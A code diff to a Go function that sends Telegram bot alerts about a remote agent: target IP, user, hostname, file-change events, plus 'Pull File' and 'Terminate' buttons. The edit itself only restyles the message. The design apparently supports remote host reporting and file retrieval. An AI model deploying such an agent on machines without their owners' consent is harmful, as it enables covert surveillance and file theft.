@@ -46,37 +46,25 @@ func SendAlert(data AlertData) error {
 
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
 
-	icon := "🔔"
-	switch data.EventType {
-	case "AGENT_ONLINE":
-		icon = "🟢"
-	case "FILE_DELETED":
-		icon = "🗑️"
-	case "FILE_EDITED":
-		icon = "📝"
-	case "INSTALL_SUCCESS":
-		icon = "🚀"
-	}
-
 	report := fmt.Sprintf(
-		"<b>%s SYSTEM ALERT: %s</b>\n"+
-			"━━━━━━━━━━━━━━━━━━━━\n"+
-			"<b>📍 IP TARGET :</b> <code>%s</code>\n"+
-			"<b>👤 USER      :</b> <code>%s</code>\n"+
-			"<b>🖥️ HOSTNAME  :</b> <code>%s</code>\n"+
-			"<b>🎬 ACTION    :</b> <b>%s</b>\n"+
-			"<b>📂 PATH      :</b> <code>%s</code>\n"+
-			"<b>📝 DETAILS   :</b> %s\n"+
-			"━━━━━━━━━━━━━━━━━━━━\n"+
-			"<i>🕒 TIMESTAMP : %s</i>",
-		icon, data.EventType,
+		"<b>SYSTEM ALERT: [%s]</b>\n"+
+			"----------------------------\n"+
+			"<b>TARGET IP :</b> <code>%s</code>\n"+
+			"<b>USER      :</b> <code>%s</code>\n"+
+			"<b>HOSTNAME  :</b> <code>%s</code>\n"+
+			"<b>ACTION    :</b> <b>%s</b>\n"+
+			"<b>PATH      :</b> <code>%s</code>\n"+
+			"<b>TIMESTAMP :</b> <code>%s</code>\n"+
+			"----------------------------\n"+
+			"<b>INFO      :</b> %s",
+		data.EventType,
 		data.IP,
 		data.User,
 		data.Hostname,
 		data.EventType,
 		data.FilePath,
-		data.Details,
 		time.Now().Format("2006-01-02 15:04:05"),
+		data.Details,
 	)
 
 	vals := url.Values{}
@@ -87,7 +75,7 @@ func SendAlert(data AlertData) error {
 
 	// Add Interactive Buttons
 	if data.FilePath != "" && data.FilePath != "N/A" {
-		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "📥 Pull File", "callback_data": "pull:%s"}, {"text": "💀 Terminate", "callback_data": "term"}]]}`, data.FilePath)
+		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "Pull File", "callback_data": "pull:%s"}, {"text": "Terminate", "callback_data": "term"}]]}`, data.FilePath)
 		vals.Set("reply_markup", keyboard)
 	}
 
